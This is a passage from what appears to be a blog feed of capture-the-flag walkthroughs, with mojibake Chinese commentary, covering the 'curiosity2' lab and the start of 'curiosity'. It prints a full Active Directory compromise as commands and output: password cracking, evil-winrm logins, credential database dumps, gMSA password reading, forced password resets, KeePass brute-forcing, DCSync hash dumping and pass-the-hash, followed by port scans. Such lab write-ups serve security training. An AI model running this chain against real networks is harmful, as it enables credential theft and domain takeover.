Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1785.6 kH/s (1.52ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/5390 (75.99%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/5390 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $pr1ng -&gt; W1NT3R2021@
Hardware.Mon.#1..: Util: 12%

Started: Mon Dec 16 16:26:39 2024
Stopped: Mon Dec 16 16:26:41 2024


<br>æˆåŠŸè·å–åˆ°äº†ä¸¤ä¸ªè´¦å·å¯†ç <br>SQLDB ï¼š au7umn@ <br>
APPOLONIA ï¼š 5umm3r@<br>æµ‹è¯•åä¸¤ä¸ªéƒ½å¯ä»¥ç™»å½•ä¸Šå»<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity2]
â””â”€# evil-winrm -i 192.168.56.116 -u APPOLONIA -p '5umm3r@'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\appolonia\Documents&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity2]
â””â”€# evil-winrm -i 192.168.56.116 -u SQLDB -p 'au7umn@'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sqldb\Documents&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

<br><br>è·å–æ•°æ®åº“ä¿¡æ¯<br>*Evil-WinRM* PS C:\Users\sqldb\Documents&gt; reg query "HKLM\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL
    SQLEXPRESS    REG_SZ    MSSQL15.SQLEXPRESS
<br>æ•°æ®åº“åå­—æ˜¯ SQLEXPRESS ä½†å®Œæ•´çš„åå­—æ˜¯ WIN-C73PROQLRHL\SQLEXPRESS<br>*Evil-WinRM* PS C:\Users\sqldb\Documents&gt; sqlcmd -E -S 'WIN-C73PROQLRHL\SQLEXPRESS' -Q 'select @@version;'

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 &lt;X64&gt; (Build 14393: ) (Hypervisor)

(1 rows affected)\
<br>æŸ¥è¯¢æ•°æ®åº“åç§°<br>*Evil-WinRM* PS C:\Users\sqldb\Documents&gt; sqlcmd -E -S 'WIN-C73PROQLRHL\SQLEXPRESS' -Q 'SELECT name FROM master.dbo.sysdatabases;'
name
--------------------------------------------------------------------------------------------------------------------------------
master
tempdb
model
msdb
CredentialsDB
toolsdb

(6 rows affected)

<br>é‡Œé¢æœ‰ä¸€ä¸ª CredentialsDB æ•°æ®åº“ é‡Œé¢å¯èƒ½æœ‰æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ æŸ¥çœ‹ä¸€ä¸‹<br>*Evil-WinRM* PS C:\Users\sqldb\Documents&gt; sqlcmd -E -S 'WIN-C73PROQLRHL\SQLEXPRESS' -d CredentialsDB -Q "SELECT * FROM dbo.Credentials;"
ID          Username                                           Password
----------- -------------------------------------------------- ----------------------------------------------------------------------------------------------------
          1 sqlsvc                                             a6d888301de7aa3b380a691d32837627

(1 rows affected)

<br>ç ´è§£ä¸€ä¸‹è¿™ä¸ªmd5<br>a6d888301de7aa3b380a691d32837627:$PRING2021#
<br>è·å–åˆ° sqlsvc ç”¨æˆ·çš„å¯†ç  $PRING2021#<br>
æ”¶é›†ä¸€ä¸‹åŸŸå†…ä¿¡æ¯<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity2]
â””â”€# netexec ldap 192.168.56.116 -u 'SQLDB' -p 'au7umn@'  --bloodhound --collection All --dns-server 192.168.56.116
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False)
LDAP        192.168.56.116  389    WIN-C73PROQLRHL  [+] cons.thl\SQLDB:au7umn@
LDAP        192.168.56.116  389    WIN-C73PROQLRHL  Resolved collection methods: acl, group, localadmin, psremote, trusts, objectprops, session, rdp, dcom, container
LDAP        192.168.56.116  389    WIN-C73PROQLRHL  Done in 00M 00S
LDAP        192.168.56.116  389    WIN-C73PROQLRHL  Compressing output into /root/.nxc/logs/WIN-C73PROQLRHL_192.168.56.116_2024-12-16_165009_bloodhound.zip

<br>ä½¿ç”¨ netexec æ”¶é›†å¤±è´¥ã€‚å¯èƒ½æ˜¯é‚£é‡Œå‡ºäº†é—®é¢˜<br>
ç›´æ¥ä¼ SharpHound.exe ä¸Šå»æ”¶é›†<br>*Evil-WinRM* PS C:\Users\sqlsvc\Documents&gt; upload /home/kali/thl/curiosity2/SharpHound.exe

Info: Uploading /home/kali/thl/curiosity2/SharpHound.exe to C:\Users\sqlsvc\Documents\SharpHound.exe

Data: 1395368 bytes of 1395368 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\sqlsvc\Documents&gt; ls


    Directory: C:\Users\sqlsvc\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/31/2024   6:23 PM           2231 Database.kdbx
-a----       12/16/2024   4:55 PM        1046528 SharpHound.exe


*Evil-WinRM* PS C:\Users\sqlsvc\Documents&gt; ./SharpHound.exe
2024-12-16T16:55:38.5773646+01:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2024-12-16T16:55:39.0929517+01:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-12-16T16:55:39.4209905+01:00|INFORMATION|Initializing SharpHound at 16:55 on 16/12/2024
2024-12-16T16:55:42.0303498+01:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for cons.thl : WIN-C73PROQLRHL.cons.thl
2024-12-16T16:55:42.1237157+01:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-12-16T16:55:42.5300046+01:00|INFORMATION|Beginning LDAP search for cons.thl
2024-12-16T16:55:42.6708951+01:00|INFORMATION|Producer has finished, closing LDAP channel
2024-12-16T16:55:42.6868321+01:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-12-16T16:56:12.8426741+01:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2024-12-16T16:56:29.4678294+01:00|INFORMATION|Consumers finished, closing output channel
2024-12-16T16:56:29.5152889+01:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2024-12-16T16:56:29.8740248+01:00|INFORMATION|Status: 192 objects finished (+192 4.085106)/s -- Using 42 MB RAM
2024-12-16T16:56:29.8740248+01:00|INFORMATION|Enumeration finished in 00:00:47.3672286
2024-12-16T16:56:30.0931388+01:00|INFORMATION|Saving cache with stats: 152 ID to type mappings.
 152 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-12-16T16:56:30.1869703+01:00|INFORMATION|SharpHound Enumeration Completed at 16:56 on 16/12/2024! Happy Graphing!
*Evil-WinRM* PS C:\Users\sqlsvc\Documents&gt; ls


    Directory: C:\Users\sqlsvc\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/16/2024   4:56 PM          16777 20241216165628_BloodHound.zip
-a----       10/31/2024   6:23 PM           2231 Database.kdbx
-a----       12/16/2024   4:56 PM          22359 NzAyMzNmYzYtYzFjNi00MDYxLTg5ZTYtY2FmOWMwODg1MzZm.bin
-a----       12/16/2024   4:55 PM        1046528 SharpHound.exe


*Evil-WinRM* PS C:\Users\sqlsvc\Documents&gt; download 20241216165628_BloodHound.zip

Info: Downloading C:\Users\sqlsvc\Documents\20241216165628_BloodHound.zip to 20241216165628_BloodHound.zip

Info: Download successful!

<br>
åœ¨æ”¶é›†æ—¶å‘ç°å½“å‰æ–‡ä»¶å¤¹ä¸‹é¢æœ‰ä¸€ä¸ª Database.kdbx æˆ‘ä»¬å°†å…¶ä¸‹è½½ä¸‹æ¥<br>
.kdbx æ˜¯ KeePass å¯†ç ç®¡ç†å™¨ä½¿ç”¨çš„ä¸€ç§åŠ å¯†æ•°æ®åº“æ–‡ä»¶æ ¼å¼ã€‚æ˜¯ KeePass 2.x åŠæ›´é«˜ç‰ˆæœ¬ä½¿ç”¨çš„æ•°æ®åº“æ–‡ä»¶æ ¼å¼
<br>æˆ‘ä»¬å½“å‰ç”¨æˆ· SQLSVC æ˜¯å±äº SVCACCOUNTS ç»„<br>
<img alt="Pasted image 20241216170557" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216170557.png" referrerpolicy="no-referrer"><br>
è€Œä¸”è¯¥ç»„å¯ä»¥è¯»å– GMSA_SQL$ æœºå™¨ç”¨æˆ·çš„å¯†ç <br>
<img alt="Pasted image 20241216170702" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216170702.png" referrerpolicy="no-referrer"><br>è·å–å¯†ç <br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity2]
â””â”€# nxc ldap 192.168.56.116 -u 'sqlsvc' -p '$PRING2021#' --gmsa
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False)
LDAPS       192.168.56.116  636    WIN-C73PROQLRHL  [+] cons.thl\sqlsvc:$PRING2021#
LDAPS       192.168.56.116  636    WIN-C73PROQLRHL  [*] Getting GMSA Passwords
LDAPS       192.168.56.116  636    WIN-C73PROQLRHL  Account: GMSA_SQL$            NTLM: 1ac0f76a248b111e724b9ca39da34988

<br>åˆ†æè¯¥æœºå™¨ç”¨æˆ·çš„æƒé™å¯ä»¥å‘ç°å¯ä»¥ä¿®æ”¹å¦ä¸€ä¸ªç”¨æˆ·çš„å¯†ç <br>
<img alt="Pasted image 20241216171032" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216171032.png" referrerpolicy="no-referrer"><br>
ä¿®æ”¹å¯†ç <br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity2]
â””â”€# impacket-changepasswd CONS.THL/toolsdb@cons.thl -newpass 'admin!@#45' -altuser "GMSA_SQL$" -althash ':1ac0f76a248b111e724b9ca39da34988' -no-pass -reset
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Setting the password of CONS.THL\toolsdb as CONS.THL\GMSA_SQL$
[*] Connecting to DCE/RPC as CONS.THL\GMSA_SQL$
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.
<br>æ ¹æ®è¿™ä¸ªåå­—<br><br>ç™»å½• toolsdb ç”¨æˆ· ï¼Œæ ¹æ®è¿™ä¸ªç”¨æˆ·åå°±èƒ½çŒœæµ‹å‡ºå¤šåŠè¿™ä¸ªç”¨æˆ·æ•°æ®åº“é‡Œé¢æ˜¯æœ‰ä¸œè¥¿çš„ï¼Œè€Œä¸”è½½ä¸Šé¢æ•°æ®åº“æŸ¥è¯¢æ—¶æ—¶å‘ç°æœ‰ä¸€ä¸ª toolsdb æ•°æ®åº“ ä½†æ˜¯æˆ‘ä»¬å½“æ—¶ç”¨æˆ·æ²¡æœ‰æƒé™æŸ¥è¯¢<br>åˆ©ç”¨è¿™ä¸ªç”¨æˆ·æŸ¥çœ‹ toolsdb æ•°æ®åº“çš„å†…å®¹<br>
æŸ¥çœ‹æ•°æ®åº“è¡¨å<br>*Evil-WinRM* PS C:\Users\toolsdb\Documents&gt; sqlcmd -E -S "localhost\SQLEXPRESS" -d "toolsdb" -Q "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';"
TABLE_NAME
--------------------------------------------------------------------------------------------------------------------------------
users

(1 rows affected)

<br>æŸ¥çœ‹usersè¡¨çš„å†…å®¹<br>*Evil-WinRM* PS C:\Users\toolsdb\Documents&gt; sqlcmd -E -S 'WIN-C73PROQLRHL\SQLEXPRESS' -d toolsdb -Q "SELECT * FROM users;"
id          username                                           password
----------- -------------------------------------------------- --------------------------------------------------
          1 user_6B482050                                      433129A1!@1
          2 user_47F7501A                                      64409A1C!@1
          3 user_515A0C58                                      CAD616E3!@1
          4 user_CA843BF2                                      731C60AD!@1
          5 user_AA2B9FF8                                      8E181E5F!@1
          6 user_F6E6A108                                      47862562!@1
          7 user_8D56BAE8                                      425B6335!@1
          8 user_BA9B1295                                      E4FC1AC4!@1
          9 user_66B7DBEE                                      4EE216A3!@1
         10 user_E75B7C23                                      4CD89A92!@1

(10 rows affected)

<br><br>å°†è¿™äº›å¯†ç å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œé¢ä½œä¸ºå­—å…¸<br>
ç„¶åä½¿ç”¨rpcclientè·å–åŸŸå†…æ‰€æœ‰çš„ç”¨æˆ·<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity2]
â””â”€# rpcclient -U "Appolonia%5umm3r@" 192.168.56.116 -c 'enumdomusers'|cut -d '[' -f2|cut -d ']' -f1 &gt;dbuser.txt
<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity2]
â””â”€# crackmapexec smb cons.thl -u dbuser.txt  -p userdb_pass --continue-on-success
SMB         cons.thl        445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False)
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:433129A1!@1 STATUS_LOGON_FAILURE
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:64409A1C!@1 STATUS_LOGON_FAILURE
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:CAD616E3!@1 STATUS_LOGON_FAILURE
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:731C60AD!@1 STATUS_LOGON_FAILURE
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:8E181E5F!@1 STATUS_LOGON_FAILURE
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:47862562!@1 STATUS_LOGON_FAILURE
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:425B6335!@1 STATUS_LOGON_FAILURE
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:E4FC1AC4!@1 STATUS_LOGON_FAILURE
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:4EE216A3!@1 STATUS_LOGON_FAILURE
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Administrator:4CD89A92!@1 STATUS_LOGON_FAILURE
SMB         cons.thl        445    WIN-C73PROQLRHL  [-] cons.thl\Guest:433129A1!@1 STATUS_LOGON_FAILURE

...
<br>å…¨éƒ¨å¤±è´¥äº†<br>å¯èƒ½è¿™ä¸ªå¯†ç ä¸æ˜¯è¿™äº›ç”¨æˆ·çš„<br><br>æœ‰å¯èƒ½æ˜¯æˆ‘ä»¬ä¹‹å‰è·å–çš„kdbxæ–‡ä»¶æ•°æ®åº“çš„å¯†ç <br>
åˆ©ç”¨å·¥å…·è¿›è¡Œçˆ†ç ´<br>
<a rel="noopener nofollow" class="external-link" href="https://github.com/r3nt0n/keepass4brute" target="_blank">https://github.com/r3nt0n/keepass4brute</a><br>
éœ€è¦å…ˆå®‰è£…å‰ç½®ç¯å¢ƒ<br>add-apt-repository -y ppa:phoerious/keepassxc
apt update &amp;&amp; sudo apt install keepassxc
<br>çˆ†ç ´å¯†ç <br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity2]
â””â”€# ./keepass4brute.sh Database.kdbx userdb_pass
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 5/9 - Attempts per minute: 0 - Estimated time remaining: Calculating...
[+] Current attempt: 8E181E5F!@1

[*] Password found: 8E181E5F!@1

<br>æˆåŠŸè·å–åˆ°æ•°æ®åº“çš„å¯†ç  8E181E5F!@1<br>æŸ¥çœ‹æ•°æ®åº“æ–‡ä»¶å†…å®¹<br>
<img alt="Pasted image 20241216181212" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216181212.png" referrerpolicy="no-referrer"><br>
å¯ä»¥å‘ç°æœ‰ MSOL ç”¨æˆ·çš„å¯†ç  YRax2Ry8g2ITQ3hpRPze<br><br>åˆ†æ MSOL ç”¨æˆ·ï¼Œå‘ç°å¯ä»¥æ‰§è¡ŒDCSyncæ”»å‡»<br>
<img alt="Pasted image 20241216181401" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216181401.png" referrerpolicy="no-referrer"><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/â€¦/thl/curiosity2/impacket-master/impacket]
â””â”€# impacket-secretsdump MSOL:'YRax2Ry8g2ITQ3hpRPze'@WIN-C73PROQLRHL.cons.thl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5d48bcf84aea999fb1ade06970a81237:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a6c4014f622dcadd4ec24cec540aaa86:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
cons.thl\sqlsvc:1104:aad3b435b51404eeaad3b435b51404ee:17e75629f370f459434786808006cac1:::
cons.thl\jwats:1105:aad3b435b51404eeaad3b435b51404ee:197c3e98518a436666dbe95d78dc87a6:::

...
<br>pthä¸Šå»è·å–flag<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity2]
â””â”€# evil-winrm -i 192.168.56.116 -u Administrator -H '5d48bcf84aea999fb1ade06970a81237'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
cons\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type root.flag.txt
372a1c39714b6bbcec0f85de5c6c2599

*Evil-WinRM* PS C:\Users\appolonia\documents&gt; type user.flag.txt
de4769769d10f96ae069e9926a10454e

]]></description><link>https://www.c1trus.top/24-æ¸—é€/thl/6.curiosity2.html</link><guid isPermaLink="false">24-æ¸—é€/THL/6.curiosity2.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216170557.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241216170557.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[5.curiosity]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç«¯å£æ‰«æ" data-href="#2.1. ç«¯å£æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç«¯å£æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç«¯å£æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.2. smbç©ºä¼šè¯æ£€æµ‹" data-href="#2.2. smbç©ºä¼šè¯æ£€æµ‹" href="https://www.c1trus.top/about:blank#2.2._smbç©ºä¼šè¯æ£€æµ‹" class="internal-link" target="_self" rel="noopener nofollow">2.2. smbç©ºä¼šè¯æ£€æµ‹</a>
<br><a data-tooltip-position="top" aria-label="2.3. kerbruteçˆ†ç ´åŸŸå†…ç”¨æˆ·" data-href="#2.3. kerbruteçˆ†ç ´åŸŸå†…ç”¨æˆ·" href="https://www.c1trus.top/about:blank#2.3._kerbruteçˆ†ç ´åŸŸå†…ç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">2.3. kerbruteçˆ†ç ´åŸŸå†…ç”¨æˆ·</a>
<br><a data-tooltip-position="top" aria-label="2.4. NTMLä¸­æ¯’æ”»å‡»" data-href="#2.4. NTMLä¸­æ¯’æ”»å‡»" href="https://www.c1trus.top/about:blank#2.4._NTMLä¸­æ¯’æ”»å‡»" class="internal-link" target="_self" rel="noopener nofollow">2.4. NTMLä¸­æ¯’æ”»å‡»</a>
<br><a data-tooltip-position="top" aria-label="2.5. winrmè¿æ¥" data-href="#2.5. winrmè¿æ¥" href="https://www.c1trus.top/about:blank#2.5._winrmè¿æ¥" class="internal-link" target="_self" rel="noopener nofollow">2.5. winrmè¿æ¥</a>


<br><a data-tooltip-position="top" aria-label="3. ææƒ" data-href="#3. ææƒ" href="https://www.c1trus.top/about:blank#3._ææƒ" class="internal-link" target="_self" rel="noopener nofollow">3. ææƒ</a>

<br><a data-tooltip-position="top" aria-label="3.1. bloodhoundåˆ†æåŸŸå†…ç¯å¢ƒ" data-href="#3.1. bloodhoundåˆ†æåŸŸå†…ç¯å¢ƒ" href="https://www.c1trus.top/about:blank#3.1._bloodhoundåˆ†æåŸŸå†…ç¯å¢ƒ" class="internal-link" target="_self" rel="noopener nofollow">3.1. bloodhoundåˆ†æåŸŸå†…ç¯å¢ƒ</a>
<br><a data-tooltip-position="top" aria-label="3.2. ä¿®æ”¹ DBA_ADM ç”¨æˆ·å¯†ç " data-href="#3.2. ä¿®æ”¹ DBA_ADM ç”¨æˆ·å¯†ç " href="https://www.c1trus.top/about:blank#3.2._ä¿®æ”¹_DBA_ADM_ç”¨æˆ·å¯†ç " class="internal-link" target="_self" rel="noopener nofollow">3.2. ä¿®æ”¹ DBA_ADM ç”¨æˆ·å¯†ç </a>
<br><a data-tooltip-position="top" aria-label="3.3. sqlcmdè·å–æ•°æ®åº“å†…å®¹" data-href="#3.3. sqlcmdè·å–æ•°æ®åº“å†…å®¹" href="https://www.c1trus.top/about:blank#3.3._sqlcmdè·å–æ•°æ®åº“å†…å®¹" class="internal-link" target="_self" rel="noopener nofollow">3.3. sqlcmdè·å–æ•°æ®åº“å†…å®¹</a>
<br><a data-tooltip-position="top" aria-label="3.4. è§£å¯†hash" data-href="#3.4. è§£å¯†hash" href="https://www.c1trus.top/about:blank#3.4._è§£å¯†hash" class="internal-link" target="_self" rel="noopener nofollow">3.4. è§£å¯†hash</a>
<br><a data-tooltip-position="top" aria-label="3.5. åˆ†æSQLSVCç”¨æˆ·æƒé™" data-href="#3.5. åˆ†æSQLSVCç”¨æˆ·æƒé™" href="https://www.c1trus.top/about:blank#3.5._åˆ†æSQLSVCç”¨æˆ·æƒé™" class="internal-link" target="_self" rel="noopener nofollow">3.5. åˆ†æSQLSVCç”¨æˆ·æƒé™</a>


<br><a data-tooltip-position="top" aria-label="4. çº¦æŸæ€§å§”æ´¾" data-href="#4. çº¦æŸæ€§å§”æ´¾" href="https://www.c1trus.top/about:blank#4._çº¦æŸæ€§å§”æ´¾" class="internal-link" target="_self" rel="noopener nofollow">4. çº¦æŸæ€§å§”æ´¾</a><br>
- <a data-tooltip-position="top" aria-label="4.1. åœ¨åˆ†ææœºå™¨GMSA_SVC$çš„æƒé™" data-href="#4.1. åœ¨åˆ†ææœºå™¨GMSA_SVC$çš„æƒé™" href="https://www.c1trus.top/about:blank#4.1._åœ¨åˆ†ææœºå™¨GMSA_SVC$çš„æƒé™" class="internal-link" target="_self" rel="noopener nofollow">4.1. åœ¨åˆ†ææœºå™¨GMSA_SVC$çš„æƒé™</a><br>
é¶æœºé“¾æ¥<br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸
<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity]
â””â”€# fscan -h 192.168.56.8

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _`' |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.8:88 open
192.168.56.8:135 open
192.168.56.8:139 open
192.168.56.8:445 open
[*] alive ports len is: 4
start vulscan
[*] NetInfo
[*]192.168.56.8
   [-&gt;]DC
   [-&gt;]192.168.56.8
   [-&gt;]10.16.82.189
   [-&gt;]2409:8760:1e81:10::2:8e3e
   [-&gt;]2001:0:348b:fb58:49f:3950:f5ef:ad42
[*] NetBios 192.168.56.8    [+] DC:HACKME\DC
å·²å®Œæˆ 4/4
[*] æ‰«æç»“æŸ,è€—æ—¶: 2.061390421s

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity]
â””â”€# nmap -sCV 192.168.56.8
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 19:23 CST
Nmap scan report for 192.168.56.8
Host is up (0.00014s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-09 17:23:07Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
|_ssl-date: 2024-12-09T17:23:55+00:00; +5h59m58s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
|_ssl-date: 2024-12-09T17:23:55+00:00; +5h59m58s from scanner time.
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
|_ssl-date: 2024-12-09T17:23:55+00:00; +5h59m58s from scanner time.
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)
|_ssl-date: 2024-12-09T17:23:55+00:00; +5h59m58s from scanner time.
| ssl-cert: Subject: commonName=DC.hackme.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.hackme.thl
| Not valid before: 2024-10-16T13:11:58
|_Not valid after:  2025-10-16T13:11:58
